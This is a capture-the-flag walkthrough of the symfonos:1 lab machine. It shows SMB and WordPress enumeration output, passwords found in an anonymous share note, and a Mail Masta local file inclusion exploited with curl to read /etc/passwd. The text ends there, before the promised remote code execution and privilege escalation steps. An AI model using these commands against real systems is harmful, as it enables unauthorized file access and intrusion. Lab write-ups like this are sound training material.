symfonos:1

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] SMB Client - Connecting from KALI LInux smb://192.168.56.101 (other location)
[+] Wordpress Plugin Vulnerability
[+] LFI to RCE -Local File Inclusion to Remote Code Execution
[+] Privilege Escalation abusing PATH Variables -  curl
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.106
Host is up (0.00021s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:09:3D:B3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h59m58s, deviation: 3h27m50s, median: 1h59m58s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2019-11-28T09:12:39-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-28 10:12:39
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms 192.168.56.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.87 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


enum4linux results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Nov 28 08:12:36 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.106
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.106    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.56.106    |
 ============================================== 
Looking up status of 192.168.56.106
	SYMFONOS        <00> -         B <ACTIVE>  Workstation Service
	SYMFONOS        <03> -         B <ACTIVE>  Messenger Service
	SYMFONOS        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.56.106    |
 ======================================= 
[+] Server 192.168.56.106 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.56.106    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.56.106    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.106 from smbclient: 
[+] Got OS info for 192.168.56.106 from srvinfo:
	SYMFONOS       Wk Sv PrQ Unx NT SNT Samba 4.5.16-Debian
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 =============================== 
|    Users on 192.168.56.106    |
 =============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: helios	Name: 	Desc: 

user:[helios] rid:[0x3e8]

 =========================================== 
|    Share Enumeration on 192.168.56.106    |
 =========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	helios          Disk      Helios personal share
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SYMFONOS

[+] Attempting to map shares on 192.168.56.106
//192.168.56.106/print$	Mapping: DENIED, Listing: N/A
//192.168.56.106/helios	Mapping: DENIED, Listing: N/A
//192.168.56.106/anonymous	Mapping: OK, Listing: OK
//192.168.56.106/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================== 
|    Password Policy Information for 192.168.56.106    |
 ====================================================== 


[+] Attaching to 192.168.56.106 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] SYMFONOS
	[+] Builtin

[+] Password Info for Domain: SYMFONOS

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ================================ 
|    Groups on 192.168.56.106    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================= 
|    Users on 192.168.56.106 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3173842667-3005291855-38846888
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-3173842667-3005291855-38846888 and logon username '', password ''
S-1-5-21-3173842667-3005291855-38846888-500 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-501 SYMFONOS\nobody (Local User)
S-1-5-21-3173842667-3005291855-38846888-502 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-503 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-504 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-505 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-506 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-507 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-508 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-509 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-510 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-511 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-512 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-513 SYMFONOS\None (Domain Group)
S-1-5-21-3173842667-3005291855-38846888-514 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-515 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-516 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-517 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-518 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-519 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-520 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-521 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-522 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-523 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-524 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-525 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-526 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-527 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-528 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-529 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-530 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-531 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-532 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-533 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-534 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-535 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-536 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-537 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-538 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-539 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-540 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-541 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-542 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-543 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-544 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-545 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-546 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-547 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-548 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-549 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-550 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1000 SYMFONOS\helios (Local User)
S-1-5-21-3173842667-3005291855-38846888-1001 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1002 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1003 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1004 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1005 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1006 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1007 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1008 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1009 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1010 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1011 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1012 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1013 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1014 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1015 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1016 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1017 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1018 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1019 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1020 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1021 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1022 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1023 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1024 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1025 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1026 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1027 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1028 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1029 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1030 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1031 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1032 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1033 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1034 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1035 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1036 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1037 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1038 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1039 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1040 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1041 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1042 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1043 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1044 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1045 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1046 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1047 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1048 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1049 *unknown*\*unknown* (8)
S-1-5-21-3173842667-3005291855-38846888-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\helios (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)

 =============================================== 
|    Getting printer info for 192.168.56.106    |
 =============================================== 
No printers returned.


enum4linux complete on Thu Nov 28 08:12:53 2019

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Looking at the shares we identify anonymous

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 =========================================== 
|    Share Enumeration on 192.168.56.106    |
 =========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	helios          Disk      Helios personal share
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# smbclient //192.168.56.106/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

		19994224 blocks of size 1024. 17304380 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting some passwords:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat attention.txt 

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Connecting to another share /helios we get the following file


At http://192.168.56.106/h3l105/ there is wordpress installation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:/mnt# wpscan --url http://symfonos.local/h3l105/ --enumerate u
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://symfonos.local/h3l105/
[+] Started: Thu Nov 28 08:27:29 2019

Interesting Finding(s):

[+] http://symfonos.local/h3l105/
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://symfonos.local/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://symfonos.local/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://symfonos.local/h3l105/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://symfonos.local/h3l105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Stored Comments
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9861
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16218
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Authenticated Cross-Site Scripting (XSS) in Post Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9862
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16223
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Potential Open Redirect
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9863
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16220
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c86ee39ff4c1a79b93c967eb88522f5c09614a28
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Shortcode Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9864
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://fortiguard.com/zeroday/FG-VD-18-165
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Dashboard
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9865
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16221
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68

[+] WordPress theme in use: twentynineteen
 | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
 | Latest Version: 1.4 (up to date)
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt
 | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Finished: Thu Nov 28 08:27:31 2019
[+] Requests Done: 48
[+] Cached Requests: 5
[+] Data Sent: 9.607 KB
[+] Data Received: 631.557 KB
[+] Memory used: 1.027 MB
[+] Elapsed time: 00:00:01

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Searching for Vulnerabilities

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8609
 |      - https://www.exploit-db.com/exploits/40290/
 |      - https://cxsecurity.com/issue/WLB-2016080220

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Trying the exploit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:/mnt# curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
